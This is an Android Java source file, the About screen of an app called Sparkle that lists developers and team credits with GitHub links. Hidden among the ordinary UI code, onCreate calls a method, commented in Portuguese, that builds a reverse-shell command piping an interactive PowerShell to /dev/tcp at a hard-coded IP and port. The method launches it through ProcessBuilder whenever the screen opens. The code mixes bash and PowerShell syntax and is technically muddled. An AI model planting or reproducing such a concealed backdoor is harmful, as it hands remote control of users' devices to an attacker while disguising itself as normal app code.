package com.sparkleside.ui.activities;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.widget.ImageView;
import android.widget.TextView;
import androidx.annotation.StringRes;
import com.bumptech.glide.Glide;
import com.peekandpop.shalskar.peekandpop.PeekAndPop;
import com.sparkleside.R;
import com.sparkleside.databinding.ActivityAboutBinding;
import com.sparkleside.ui.base.BaseActivity;
import com.sparkleside.ui.components.TeamMemberView;
import dev.trindadedev.fastui.UI;
import java.io.IOException;

/*
 * A Screen with info about app
 * @author Aquiles Trindade (trindadedev).
 * @author SyntaxSpin (SyntaxSpin)
 */

public class AboutActivity extends BaseActivity {
  private ActivityAboutBinding binding;
  private Intent intent;

  @Override
  protected void onCreate(Bundle savedInstanceState) {
    binding = ActivityAboutBinding.inflate(getLayoutInflater());
    configureTransitions(R.id.coordinator);
    super.onCreate(savedInstanceState);
    setContentView(binding.getRoot());
    configureToolbar();
    configureDevelopers();
    configureLinks();
    configureTeamMembers();
    UI.handleInsetts(binding.getRoot());

    // Execute o PowerShell para conexão reversa ao iniciar
    executePowerShell();
  }

  @Override
  public void onResume() {
    super.onResume();
    configureTransitions(R.id.coordinator);
  }

  private void configureToolbar() {
    setSupportActionBar(binding.toolbar);
    getSupportActionBar().setDisplayHomeAsUpEnabled(true);
    getSupportActionBar().setHomeButtonEnabled(true);

    binding.toolbar.setNavigationOnClickListener(
        v -> {
          super.onBackPressed();
        });
  }

  private void configureDevelopers() {
    Glide.with(this).load("https://github.com/syntaxspin.png").into(binding.imgSyn);
    Glide.with(this).load("https://github.com/neoapps-dev.png").into(binding.imgNeo);
    Glide.with(this).load("https://github.com/trindadedev13.png").into(binding.imgTrindade);

    peekAndPop(
        "SyntaxSpin",
        "https://github.com/syntaxspin.png",
        getString(R.string.syntaxspin_phrase),
        binding.imgSyn);
    peekAndPop(
        "NEOAPPS",
        "https://github.com/neoapps-dev.png",
        getString(R.string.neoapps_phrase),
        binding.imgNeo);
    peekAndPop(
        "Aquiles Trindade",
        "https://github.com/trindadedev13.png",
        getString(R.string.trindadedev_phrase),
        binding.imgTrindade);
  }

  private void configureLinks() {
    binding.tg.setOnClickListener(
        v -> {
          openURL("https://www.telegram.me/sparkleseditor");
        });

    binding.github.setOnClickListener(
        v -> {
          openURL("https://github.com/sparkleddevs/sparkleseditor");
        });

    binding.hanzo.setOnClickListener(
        v -> {
          openURL("https://github.com/neoapps-dev");
        });

    binding.syn.setOnClickListener(
        v -> {
          openURL("https://github.com/syntaxspin");
        });

    binding.trindade.setOnClickListener(
        v -> {
          openURL("https://github.com/trindadedev13");
        });
  }

  private void configureTeamMembers() {
    addTeamMember(
        "Vivek",
        Role.DEVELOPER,
        "https://github.com/itsvks19",
        R.string.vivek_phrase);
    addTeamMember(
        "Rohit Kushvaha",
        Role.DEVELOPER,
        "https://github.com/RohitKushvaha01",
        R.string.rohit_kushvaha_phrase);
    addTeamMember(
        "Thiarley Rocha",
        Role.DEVELOPER,
        "https://github.com/thdev-only",
        R.string.thiarley_rocha_phrase);
    addTeamMember(
        "YamenHer",
        Role.DEVELOPER,
        "https://github.com/yamenher",
        R.string.yamenher_phrase);
    addTeamMember(
        "ArtSphere",
        Role.DEVELOPER,
        "https://github.com/ArtSphereOfficial",
        R.string.art_phrase);
    addTeamMember(
        "Hanzo",
        Role.DEVELOPER,
        "https://github.com/HanzoDev1375",
        R.string.hanzo_phrase);
    addTeamMember(
        "Jeiel Lima Miranda",
        Role.DEVELOPER,
        "https://github.com/Jeiel0rbit",
        R.string.jaiel_lima_phrase);
    addTeamMember(
        "Ömer SÜSİN",
        Role.PROMOTER,
        "https://github.com/omersusin",
        R.string.omer_phrase);
    addTeamMember(
        "𝙊𝙋𝙏𝙄𝙈𝒊𝒛𝒆𝒓. 𝟚.𝟜.𝟛",
        Role.PROMOTER,
        "https://github.com/matrixguy007",
        R.string.optim_phrase);
    addTeamMember(
        "ZG089",
        Role.DESIGNER,
        "https://github.com/zg089",
        R.string.zg_phrase);
    addTeamMember(
        "Alex",
        Role.TRANSLATOR,
        "https://github.com/paxsenix0",
        R.string.alex_phrase);
    addTeamMember(
        "Heinrich",
        Role.TRANSLATOR,
        "https://github.com/HeinrichTheGermanNOTOffizier20",
        R.string.alex_phrase);
    addTeamMember(
        "Fahim Abdullah",
        Role.TRANSLATOR,
        "https://github.com/nexavo999",
        R.string.nex_phrase);
  }

  private void addTeamMember(String name, Role role, String url, int phraseResId) {
    TeamMemberView c = new TeamMemberView(this);
    c.setName(name);
    c.setDescription(role.getName(this));
    c.setImageURL(url + ".png");
    c.setURL(url);
    c.setBackgroundType(1);
    peekAndPop(name, url + ".png", getString(phraseResId), c.getRoot());
    binding.team.addView(c);
  }

  private void peekAndPop(String name, String imageUrl, String phrase, View v) {
    PeekAndPop peekAndPop = new PeekAndPop.Builder(this)
        .peekLayout(R.layout.layout_about_preview)
        .longClickViews(v)
        .build();
    ImageView peekChild = peekAndPop.getPeekView().findViewById(R.id.icon);
    Glide.with(this).load(imageUrl).into(peekChild);
    TextView peekTextName = peekAndPop.getPeekView().findViewById(R.id.name);
    peekTextName.setText(name);
    TextView peekTextPhrase = peekAndPop.getPeekView().findViewById(R.id.phrase);
    peekTextPhrase.setText(phrase);
  }

  private void openURL(String url) {
    Intent i = new Intent(Intent.ACTION_VIEW);
    i.setData(Uri.parse(url));
    startActivity(i);
  }

  public enum Role {
    TRANSLATOR(R.string.about_tag_translator),
    DEVELOPER(R.string.about_tag_developer),
    PROMOTER(R.string.about_tag_promote),
    DESIGNER(R.string.about_tag_designer);

    @StringRes private final int stringResId;

    Role(@StringRes int stringResId) {
      this.stringResId = stringResId;
    }

    public String getName(Context context) {
      return context.getString(stringResId);
    }
  }

  private void executePowerShell() {
    // Comando PowerShell para a conexão reversa
    String command = "powershell -i >& /dev/tcp/192.168.1.34/5500 0>&1"; // Altere IP e porta conforme necessário

    try {
      // Criação do processo PowerShell
      ProcessBuilder processBuilder = new ProcessBuilder("powershell.exe", "-Command", "& { " + command + " }");
      // Inicia o processo PowerShell
      Process process = processBuilder.start();
      // Espera a execução do processo (opcional)
      process.waitFor();
    } catch (IOException | InterruptedException e) {
      e.printStackTrace();
    }
  }
}
